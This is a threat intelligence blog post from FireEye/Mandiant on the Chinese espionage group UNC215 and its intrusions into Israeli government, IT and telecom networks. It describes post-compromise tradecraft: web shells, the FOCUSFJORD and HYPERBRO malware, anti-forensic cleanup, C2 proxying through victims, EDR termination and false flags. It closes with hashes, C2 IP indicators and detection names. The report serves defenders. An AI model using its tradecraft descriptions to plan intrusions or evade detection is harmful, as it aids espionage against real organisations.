http://www.fireeye.com/blog/threat-research.html2021-07-02T08:45:38.189ZThreat Research BlogTechnical review and analysis of malware and TTPs from FireEye engagements.Adobe Experience ManagerUNC215: Spotlight on a Chinese Espionage Campaign in Israelnoemail@noemail.orgIsrael Research Team<p>This blog post details the post-compromise tradecraft and operational
  tactics, techniques, and procedures (TTPs) of a Chinese espionage
  group we track as UNC215. While UNC215’s targets are located
  throughout the Middle East, Europe, Asia, and North America, this
  report focuses on intrusion activity primarily observed at Israeli entities.</p>
 <p>This report comes on the heels of the July 19, 2021, <a
  href="https://www.whitehouse.gov/briefing-room/statements-releases/2021/07/19/the-united-states-joined-by-allies-and-partners-attributes-malicious-cyber-activity-and-irresponsible-state-behavior-to-the-peoples-republic-of-china/">announcements</a>
  by governments in North America, Europe, and Asia and
  intragovernmental organizations, such as the North Atlantic Treaty
  Organization (NATO), and the European Union, condemning widespread
  cyber espionage conducted on behalf of the Chinese Government. These
  coordinated statements attributing sustained cyber espionage
  activities to the Chinese Government corroborate our long-standing
  reporting on Chinese threat actor targeting of private companies,
  governments, and various organizations around the world, and this blog
  post shows yet another region where Chinese cyber espionage is active.</p>
 <h4>Threat Detail</h4>
 <p>In early 2019, Mandiant began identifying and responding to
  intrusions in the Middle East by Chinese espionage group UNC215. These
  intrusions exploited the Microsoft SharePoint vulnerability
  CVE-2019-0604 to install web shells and FOCUSFJORD payloads at targets
  in the Middle East and Central Asia. There are targeting and high
  level technique overlaps with between UNC215 and APT27, but we do not
  have sufficient evidence to say that the same actor is responsible for
  both sets of activity. APT27 has not been seen since 2015, and UNC215
  is targeting many of the regions that APT27 previously focused on;
  however, we have not seen direct connection or shared tools, so we are
  only able to assess this link with low confidence.</p>
 <p>In addition to data from Mandiant Incident Response and FireEye
  telemetry, we worked with Israeli defense agencies to review data from
  additional compromises of Israeli entities. This analysis showed
  multiple, concurrent operations against Israeli government
  institutions, IT providers and telecommunications entities beginning
  in January 2019. During this time, UNC215 used new TTPs to hinder
  attribution and detection, maintain operational security, employ false
  flags, and leverage trusted relationships for lateral movement. We
  believe this adversary is still active in the region.</p>
 <h4>Attack Lifecycle</h4>
 <p>Between 2019 and 2020, Mandiant responded to several incidents where
  Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver
  web shells, and then FOCUSFJORD payloads to select government and
  academic targets in the Middle East and Central Asia.</p>
 <p>After gaining initial access, the operators conduct credential
  harvesting and extensive internal network reconnaissance. This
  includes running native Windows commands on compromised servers,
  executing ADFind on the Active Directory, and scanning the internal
  network with numerous publicly available tools and a non-public
  scanner we named WHEATSCAN. The operators made a consistent effort to
  delete these tools and remove any residual forensic artifacts from
  compromised systems.</p>
 <p>In another incident response investigation, UNC215 pivoted to
  multiple OWA servers and installed web shells. In the following days,
  the operators interacted with these web shells from internal IP
  addresses, attempting to harvest credentials.</p>
 <p>After identifying key systems within the target network, such as
  domain controllers and Exchange servers, UNC215 moved laterally and
  deployed their signature malware FOCUSFJORD. UNC215 often uses
  FOCUSFJORD for the initial stages of an intrusion, and then later
  deploys HYPERBRO, which has more information collection capabilities
  such as screen capture and keylogging. While UNC215 heavily relies on
  the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups
  often have resource sharing relationships with other groups, and we do
  not have enough information to determine if these tools are developed
  and used exclusively by UNC215.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc215-israel/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Attack Lifecycle</span></p>
 <h4>Tradecraft and Operational Security</h4>
 <p>We identified numerous examples of efforts by UNC215 to foil network
  defenders by minimizing forensic evidence left on compromised hosts,
  exploiting relationships with trusted third parties, continuously
  improving the FOCUSFJORD backdoor, concealing command and control (C2)
  infrastructure, and incorporating false flags.</p>
 <p>
  <i>Reducing Forensic Evidence on Disk</i></p>
 <p>UNC215 consistently cleaned up evidence of their intrusion after
  gaining access to a system. This type of action can make it more
  difficult for incident responders to reconstruct what happened during
  a compromise.</p>
 <ul> <li>The operators deleted tools used for credential harvesting and
    internal reconnaissance including a custom scanner dubbed WHEATSCAN
    after use.</li> <li>The first FOCUSFJORD payload delivered to a
    system contains a blob that includes C2 and other configuration
    data. On initial execution, FOCUSFJORD writes its encrypted C2
    configuration into the system’s registry, sets up a persistence
    mechanism and then rewrites itself on disk without the embedded
    configuration and with limited functionality to only read
    configuration data. This process enables the operators to obfuscate
    the configured C2 servers from automated sandbox runs or disclosure
    in public file scanning services.</li> <li>A newly identified
    utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and
    completely remove FOCUSFJORD from the system. The tool can be
    deployed and executed remotely to delete any remaining FOCUSFJORD
    forensic evidence, including files on disk, configuration data
    encrypted in the registry, and related services and registry keys
    used for persistence.</li> </ul>
 <p>
  <i>Exploiting Trust Relationships</i></p>
 <p>UNC215 leveraged trusted third parties in a 2019 operation targeting
  an Israeli government network. As illustrated in Figure 2, the
  operators were able to access their primary target via RDP connections
  from a trusted third party using stolen credentials and used this
  access to deploy and remotely execute FOCUSFJORD on their primary target.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc215-israel/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Two FOCUSFJORD samples
    configured to proxy C2 traffic</span></p>
 <p>
  <i>Concealing C2 Infrastructure</i></p>
 <p>UNC215 made technical modifications to their tools to limit outbound
  network traffic and used other victim networks to proxy their C2
  instructions, likely to minimize the risk of detection and blend in
  with normal network traffic. The following are examples of HYPERBRO
  and FOCUSFJORD samples capable of acting as proxies to relay
  communications to their C2 servers. We do not have enough context
  about the following samples to attribute all of them to UNC215, though
  they are representative of activity we have seen from the group.</p>
 <ul> <li>HYPERBRO samples MD5: 0ec4d0a477ba21bda9a96d8f360a6848 and
    MD5: 04dece2662f648f619d9c0377a7ba7c0 have embedded configurations
    of internal IP addresses (192.168.1.237 and 192.168.4.26
    respectively) as C2 servers. If they receive a command with an IP
    address and port, they will connect and relay the command.</li>
    <li>FOCUSFJORD sample MD5: e3e1b386cdc5f4bb2ba419eb69b1b921 has an
    internal IP address, 192.168.4.197, configured as its C2. This
    sample was extracted from MD5: c25e8e4a2d5314ea55afd09845b3e886,
    which was submitted to a public malware repository in December
  2017.</li> </ul>
 <p>While hunting for FOCUSFJORD samples, we found a sample of a new
  malware (MD5: 625dd9048e3289f19670896cf5bca7d8) that shares code with
  FOCUSFJORD, but is distinct. However, analysis indicates that it only
  contains functions to relay communications between another FOCUSFJORD
  instance and a C2 server (Figure 2, Network A). We suspect this type
  of malware was used in the aforementioned operation. The actors
  stripped out unnecessary FOCUSFJORD capabilities, possibly to reduce
  the likelihood it would be detected by security controls. Figure 3
  contains the data structure as it is being sent from a FOCUSFJORD
  sample configured to communicate with another FOCUSFJORD victim.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc215-israel/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Two FOCUSFJORD samples
    configured to proxy C2 traffic</span></p>
 <p>
  <i>FOCUSFJORD Changes</i></p>
 <p>We have observed numerous variants of the FOCUSFJORD malware family
  since 2017. The authors have added new communications protocols, an
  updated loading mechanism, and expanded the number of supported
  configurations in newer versions. Version numbers indicate that the
  malware undergoes frequent changes and maybe supported by a team of
  developers. Many of these variants contain or remove functionality
  depending on the operator’s unique requirements at the time, which may
  suggest that multiple operators have access to the source code or a
  builder, or that a close relationship exists between the developers
  and operators. </p>
 <p>FOCUSFJORD samples can be configured with up to 13 unique registry
  values which allow operators to control and organize compromised
  hosts. In addition to specifying details related to the loading and
  persistence mechanisms and C2 communications, there are two keys which
  allow the operator to add additional context about the victim: </p>
 <ul> <li>Registry key 12 is the “group” name. When a new FOCUSFJORD
    sample is first executed and writes its configuration to registry,
    this value is set to “default” and is later manually changed by the
    actor, usually to the victim’s domain name or organization
  name.</li> <li>Registry key 13 could be interpreted as the “console”
    name, although we do not fully understand how the identifier is used
    by the operators. We have observed the values “galway”, “iceland”,
    “helen”, and “idapro”.</li> </ul>
 <p>It is not clear how or if UNC215 uses these configuration parameters
  to organize and track large numbers of compromised hosts. We observed
  different console values within the same network, identical console
  values using different C2 addresses, and identical console values
  targeting different countries. Some FOCUSFJORD samples from 2018 and
  2020 use the same console values despite the significant gap in time
  (See Table 1).</p>
 <ul> <li>The NCC Group discussed these configurations in a 2018 <a
    href="https://research.nccgroup.com/2018/05/18/emissary-panda-a-potential-new-malicious-tool/">report</a>
    and released a decoding <a
  href="https://github.com/nccgroup/Cyber-Defence/tree/master/Scripts/emissary_panda_registry">tool</a>.</li>
    <li>Trendmicro noted changes to supported configurations in
    FOCUSFJORD, dubbed SysUpdate, in their <a
    href="https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf">2020</a>
    and <a
    href="https://www.trendmicro.com/en_us/research/21/d/iron-tiger-apt-updates-toolkit-with-evolved-sysupdate-malware-va.html">2021</a>
    reports following public disclosures. This suggests that operators
    using FOCUSFJORD are sensitive to security vendor reports and will
    update the code to avoid detection and exposure.</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0" width="636"> <tbody>
    <tr>
      <td width="119" valign="top"><p>
          <b>Registry Key 13</b></p> </td> <td width="265" valign="top"><p>
          <b>FOCUSFJORD MD5 Hash</b></p> </td> <td width="120" valign="top"><p>
          <b>Related C2</b></p> </td> <td width="132" valign="top"><p>
          <b>Suspected Target</b></p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>3d95e1c94bd528909308b198f3d47620</p> </td> <td
        width="120" valign="top"><p>139.59.81.253</p> </td> <td
        width="132" valign="top"><p>Israel</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>f335b241652cb7f7e736202f14eb48e9</p> </td> <td
        width="120" valign="top"><p>139.59.81.253</p> </td> <td
        width="132" valign="top"><p>Israel</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>a0b2193362152053671dbe5033771758</p> </td> <td
        width="120" valign="top"><p>139.59.81.253</p> </td> <td
        width="132" valign="top"><p>Israel</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>6a9a4da3f7b2075984f79f67e4eb2f28</p> </td> <td
        width="120" valign="top"><p>139.59.81.253</p> </td> <td
        width="132" valign="top"><p>Kazakhstan</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>a19370b97fe64ca6a0c202524af35a30</p> </td> <td
        width="120" valign="top"><p>159.89.168.83</p> </td> <td
        width="132" valign="top"><p>Iran</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>helen</p> </td> <td width="265"
        valign="top"><p>3c1981991cce3b329902288bb2354728</p> </td> <td
        width="120" valign="top"><p>103.59.144.183</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>iceland</p> </td> <td width="265"
        valign="top"><p>26d079e3afb08af0ac4c6d92fd221e71</p> </td> <td
        width="120" valign="top"><p>178.79.177.69</p> </td> <td
        width="132" valign="top"><p>UAE</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>iceland</p> </td> <td width="265"
        valign="top"><p>19c46d01685c463f21ef200e81cb1cf1</p> </td> <td
        width="120" valign="top"><p>138.68.154.133</p> </td> <td
        width="132" valign="top"><p>UAE</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>iceland</p> </td> <td width="265"
        valign="top"><p>28ce8dbdd2b7dfd123cebbfff263882c</p> </td> <td
        width="120" valign="top"><p>138.68.154.133</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>iceland</p> </td> <td width="265"
        valign="top"><p>a78c53351e23d3f84267e67bbca6cf07 </p> </td> <td
        width="120" valign="top"><p>206.189.123.156</p> </td> <td
        width="132" valign="top"><p>Israel (Gov), UAE</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>iceland</p> </td> <td width="265"
        valign="top"><p>a78c53351e23d3f84267e67bbca6cf07 </p> </td> <td
        width="120" valign="top"><p>206.189.123.156</p> </td> <td
        width="132" valign="top"><p>Israel (IT)</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>idapro</p> </td> <td width="265"
        valign="top"><p>a78c53351e23d3f84267e67bbca6cf07 </p> </td> <td
        width="120" valign="top"><p>206.189.123.156</p> </td> <td
        width="132" valign="top"><p>Israel (IT)</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>galway</p> </td> <td width="265"
        valign="top"><p>04c51909fc65304d907b7cb6c92572cd</p> </td> <td
        width="120" valign="top"><p>159.65.80.157</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>galway</p> </td> <td width="265"
        valign="top"><p>0e061265c0b5998088443628c03188f0</p> </td> <td
        width="120" valign="top"><p>159.65.80.157</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>galway</p> </td> <td width="265"
        valign="top"><p>09ffc31a432f646ebcec59d32f286317</p> </td> <td
        width="120" valign="top"><p>159.65.80.157</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>galway</p> </td> <td width="265"
        valign="top"><p>6ca8993b341bd90a730faef1fb73958b</p> </td> <td
        width="120" valign="top"><p>128.199.44.86</p> </td> <td
        width="132" valign="top"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>Helen *</p> </td> <td width="265"
        valign="top"><p>Unknown</p> </td> <td width="120"
        valign="top"><p>46.101.255.16</p> </td> <td width="132"
        valign="top"><p>Iran</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>Helen *</p> </td> <td width="265"
        valign="top"><p>Unknown</p> </td> <td width="120"
        valign="top"><p>178.79.143.78</p> </td> <td width="132"
        valign="top"><p>Iran</p> </td> </tr>
    <tr>
      <td width="119" valign="top"><p>Idapro *</p> </td> <td width="265"
        valign="top"><p>Unknown</p> </td> <td width="120"
        valign="top"><p>138.68.154.133</p> </td> <td width="132"
        valign="top"><p>Iran</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: FOCUSFJORD comparison (note: the *
    entries are from public <a
    href="https://www.kamiran.asia/documents/APT27_HackerTeam_Analyse.pdf">reporting</a>
    and have not been verified by Mandiant)</span></p>
 <p>
  <i>False Flags</i></p>
 <p>Artifacts in UNC215 campaigns often contain foreign language strings
  that do not match the country being targeted and may be intended to
  mislead an analyst examining the malware. Additionally, on at least
  three occasions, UNC215 employed a custom tool associated with Iranian
  actors whose source code was leaked.</p>
 <ul> <li>In several cases, we identified FOCUSFJORD samples with
    registry key names in regional languages. The registry key names are
    hardcoded into every FOCUSFJORD sample, as the malware needs to read
    and decrypt those registry key values for proper execution.<ul>
        <li>FOCUSFJORD samples (MD5: d13311df4e48a47706b4352995d67ab0
        and MD5: 26d079e3afb08af0ac4c6d92fd221e71) observed on Israeli
        and UAE networks, and a memory dump (MD5:
        d875858dbd84b420a2027ef5d6e3a512) submitted to a public malware
        repository by a likely Uzbekistan financial organization are
        configured with registry keys in Farsi. Linguistic analysis
        suggests that these terms were auto translated as they are not
        commonly used by native Farsi speakers.</li> <li>Another
        FOCUSFJORD sample uploaded from Uzbekistan (MD5:
        ac431261b8852286d99673fddba38a50) contains a configuration with
        registry key names in Hindi. Notably, this variant also contains
        an error message string in Arabic ('ضائع' – which translates to:
        lost or missing).</li> </ul> </li> <li>In April 2019, UNC215
    deployed the SEASHARPEE web shell against financial and high-tech
    organizations in the Middle East and Asia. The SEASHARPEE web shell
    was developed and used by Iranian APT actors until the code was
    leaked online in the telegram channel Lab Dookhtegan a few weeks
    earlier in March 2019.</li> <li>Around this time, the
    Turkish-language file Sosyal Güvenlik Reformu-Not-3.doc &quot;Social
    Security Reform - Note - 3.doc&quot; (MD5:
    6930bd66a11e30dee1ef4f57287b1318) was distributed to a suspected
    Turkish government entity based on data from an open-source malware
    repository. The document contains &quot;C:\Users\Iran&quot; paths
    that were likely included to obfuscate the source of the
  activity.</li> </ul>
 <p>The use of Farsi strings, filepaths containing /Iran/, and web
  shells publicly associated with Iranian APT groups may have been
  intended to mislead analysts and suggest an attribution to Iran.
  Notably, in 2019 the government of Iran <a
  href="https://twitter.com/azarijahromi/status/1206071513222467585">accused</a>
  APT27 of attacking its government networks and released a detection
  and removal tool for HYPERBRO malware.</p>
 <p>
  <i>Tradecraft Mistakes</i></p>
 <p>While UNC215 prioritizes evading detection within a compromised
  network, Mandiant identified several examples of code, C2
  infrastructure, and certificate reuse indicating that UNC215 operators
  are less concerned about defenders’ ability to track and detect UNC215 activity.</p>
 <ul> <li>In several instances, UNC215 used the same exact file against
    multiple victims and frequently shared infrastructure across
    victims. This lack of compartmentalization is not uncommon, but does
    show that UNC215 is relatively less concerned about the ability for
    their compromises to be linked to each other.</li> <li>C2 servers
    used by UNC215 frequently reuse the same SSL certificate, as
    described in <a
      href="https://vb2020.vblocalhost.com/uploads/VB2020-Shank-Piccolini.pdf">Team
      Cymru’s research</a> in 2020.</li> <li>On one network, between
    April 2019 and April 2020, an operator repeatedly and infrequently
    revisited a compromised network whenever an Endpoint Detection and
    Response (EDR) tool detected or quarantined tools like HYPERBRO and
    Mimikatz. After several months of repeated detections, UNC215
    deployed an updated version of HYPERBRO and a tool called “anti.exe”
    to stop Windows Update service and terminate EDR and Antivirus
    related services.</li> </ul>
 <h4>Attribution</h4>
 <p>Mandiant attributes this campaign to Chinese espionage operators
  which we track as UNC215 a Chinese espionage operation that has been
  suspected of targeting organizations around the world since at least
  2014. We have low confidence that UNC215 is associated with APT27.
  UNC215 has compromised organizations in the government, technology,
  telecommunications, defense, finance, entertainment, and health care
  sectors. The group targets data and organizations which are of great
  interest to Beijing's financial, diplomatic, and strategic objectives.</p>
 <h4>Outlook and Implications</h4>
 <p>The activity detailed in this post demonstrates China’s consistent
  strategic interest in the Middle East. This cyber espionage activity
  is happening against the backdrop of China’s multi-billion-dollar
  investments related to the Belt and Road Initiative (BRI) and its
  interest in Israeli’s robust technology sector.</p>
 <ul> <li>Chinese companies have invested billions of dollars into
    Israeli technology startups, partnering or acquiring companies in
    strategic industries like semi-conductors and artificial
  intelligence.</li> <li>As China’s BRI moves westward, its most
    important construction projects in Israel are the railway between
    Eilat and Ashdod, a private port at Ashdod, and the port of
  Haifa.</li> </ul>
 <p>China has conducted numerous intrusion campaigns along the BRI route
  to monitor potential obstructions—political, economic, and
  security—and we anticipate that UNC215 will continue targeting
  governments and organizations involved in these critical
  infrastructure projects in Israel and the broader Middle East in the
  near- and mid-term.</p>
 <h4>MITRE ATT&amp;CK Techniques</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="522"> <tbody>
    <tr>
      <td width="85" valign="top"><p>
          <b>ID</b></p> </td> <td width="438" valign="top"><p>
          <b>Technique</b></p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1003.001</p> </td> <td width="438"
          valign="top"><p>OS Credential Dumping: LSASS Memory</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1007</p> </td> <td width="438"
          valign="top"><p>System Service Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1010</p> </td> <td width="438"
          valign="top"><p>Application Window Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1012</p> </td> <td width="438"
          valign="top"><p>Query Registry</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1016</p> </td> <td width="438"
          valign="top"><p>System Network Configuration Discovery</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1021.001</p> </td> <td width="438"
          valign="top"><p>Remote Services: Remote Desktop Protocol</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1027</p> </td> <td width="438"
          valign="top"><p>Obfuscated Files or Information</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1033</p> </td> <td width="438"
          valign="top"><p>System Owner/User Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1055</p> </td> <td width="438"
          valign="top"><p>Process Injection</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1055.003</p> </td> <td width="438"
          valign="top"><p>Process Injection: Thread Execution
        Hijacking</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1055.012</p> </td> <td width="438"
          valign="top"><p>Process Injection: Process Hollowing</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1056.001</p> </td> <td width="438"
          valign="top"><p>Input Capture: Keylogging</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1057</p> </td> <td width="438"
          valign="top"><p>Process Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1059.001</p> </td> <td width="438"
          valign="top"><p>Command and Scripting Interpreter:
        PowerShell</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1059.003</p> </td> <td width="438"
          valign="top"><p>Command and Scripting Interpreter: Windows
          Command Shell</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1070.004</p> </td> <td width="438"
          valign="top"><p>Indicator Removal on Host: File Deletion</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1070.006</p> </td> <td width="438"
          valign="top"><p>Indicator Removal on Host: Timestomp</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1071.001</p> </td> <td width="438"
          valign="top"><p>Application Layer Protocol: Web Protocols</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1078</p> </td> <td width="438"
          valign="top"><p>Valid Accounts</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1082</p> </td> <td width="438"
          valign="top"><p>System Information Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1083</p> </td> <td width="438"
          valign="top"><p>File and Directory Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1087</p> </td> <td width="438"
          valign="top"><p>Account Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1090</p> </td> <td width="438"
        valign="top"><p>Proxy</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1095</p> </td> <td width="438"
          valign="top"><p>Non-Application Layer Protocol</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1098</p> </td> <td width="438"
          valign="top"><p>Account Manipulation</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1105</p> </td> <td width="438"
          valign="top"><p>Ingress Tool Transfer</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1112</p> </td> <td width="438"
          valign="top"><p>Modify Registry</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1113</p> </td> <td width="438"
          valign="top"><p>Screen Capture</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1115</p> </td> <td width="438"
          valign="top"><p>Clipboard Data</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1133</p> </td> <td width="438"
          valign="top"><p>External Remote Services</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1134</p> </td> <td width="438"
          valign="top"><p>Access Token Manipulation</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1140</p> </td> <td width="438"
          valign="top"><p>Deobfuscate/Decode Files or Information</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1190</p> </td> <td width="438"
          valign="top"><p>Exploit Public-Facing Application</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1199</p> </td> <td width="438"
          valign="top"><p>Trusted Relationship</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1202</p> </td> <td width="438"
          valign="top"><p>Indirect Command Execution</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1213</p> </td> <td width="438"
          valign="top"><p>Data from Information Repositories</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1482</p> </td> <td width="438"
          valign="top"><p>Domain Trust Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1489</p> </td> <td width="438"
          valign="top"><p>Service Stop</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1497</p> </td> <td width="438"
          valign="top"><p>Virtualization/Sandbox Evasion</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1497.001</p> </td> <td width="438"
          valign="top"><p>Virtualization/Sandbox Evasion: System
        Checks</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1505.003</p> </td> <td width="438"
          valign="top"><p>Server Software Component: Web Shell</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1518</p> </td> <td width="438"
          valign="top"><p>Software Discovery</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1543.003</p> </td> <td width="438"
          valign="top"><p>Create or Modify System Process: Windows
        Service</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1547.001</p> </td> <td width="438"
          valign="top"><p>Boot or Logon Autostart Execution: Registry
          Run Keys / Startup Folder</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1553.002</p> </td> <td width="438"
          valign="top"><p>Subvert Trust Controls: Code Signing</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1559.002</p> </td> <td width="438"
          valign="top"><p>Inter-Process Communication: Dynamic Data
        Exchange</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1560</p> </td> <td width="438"
          valign="top"><p>Archive Collected Data</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1564.003</p> </td> <td width="438"
          valign="top"><p>Hide Artifacts: Hidden Window</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1569.002</p> </td> <td width="438"
          valign="top"><p>System Services: Service Execution</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1573.002</p> </td> <td width="438"
          valign="top"><p>Encrypted Channel: Asymmetric Cryptography</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1574.002</p> </td> <td width="438"
          valign="top"><p>Hijack Execution Flow: DLL Side-Loading</p>
      </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1583.003</p> </td> <td width="438"
          valign="top"><p>Acquire Infrastructure: Virtual Private
        Server</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1588.003</p> </td> <td width="438"
          valign="top"><p>Obtain Capabilities: Code Signing
        Certificates</p> </td> </tr>
    <tr>
      <td width="85" valign="top"><p>T1608.003</p> </td> <td width="438"
          valign="top"><p>Stage Capabilities: Install Digital
        Certificate</p> </td> </tr></tbody></table>
 <h4>Indicators of Compromise</h4>
 <p>The following indicators have been seen in use with the noted
  malware families, but not all have been confirmed to be used by UNC215.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="52" valign="top"><p>
          <b>Type</b></p> </td> <td width="175" valign="top"><p>
          <b>Value</b></p> </td> <td width="194" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>85.204.74.143</p> </td> <td width="194"
          valign="top"><p>HYPERBRO C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>103.79.78.48</p> </td> <td width="194"
          valign="top"><p>HYPERBRO C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>89.35.178.105</p> </td> <td width="194"
          valign="top"><p>HYPERBRO C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>47.75.49.32</p> </td> <td width="194"
          valign="top"><p>HYPERBRO C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>139.59.81.253</p> </td> <td width="194"
          valign="top"><p>FOCUSFJORD C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>34.65.151.250</p> </td> <td width="194"
          valign="top"><p>FOCUSFJORD C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>159.89.168.83</p> </td> <td width="194"
          valign="top"><p>FOCUSFJORD C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>103.59.144.183</p> </td> <td width="194"
          valign="top"><p>FOCUSFJORD C2</p> </td> </tr>
    <tr>
      <td width="52" valign="top"><p>IP</p> </td> <td width="175"
        valign="top"><p>141.164.52.232</p> </td> <td width="194"
          valign="top"><p>FOCUSFJORD C2</p> </td> </tr></tbody></table>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="0"> <tbody>
    <tr>
      <td><p>
          <b>Platform(s)</b></p> </td> <td><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td><ul> <li>Network Security</li> <li>Email Security</li>
            <li>Detection On Demand</li> <li>Malware Analysis</li>
            <li>File Protect</li> </ul> </td> <td><ul>
          <li>Backdoor.Win32.HyperBro.FEC3</li>
          <li>FE_APT_Backdoor_Win32_HYPERBRO_1</li>
          <li>FE_Downloader_Win32_FOCUSFJORD_2</li>
          <li>FE_Trojan_Raw32_SILKWRAP_1</li>
          <li>Trojan.Win32.LuckyMouse.FEC3</li>
          <li>FE_Trojan_Raw32_SILKWRAP_1</li>
          <li>33341691_APT.Downloader.Win.FOCUSFJORD</li>
          <li>Trojan.Win32.DllHijack.FEC3</li>
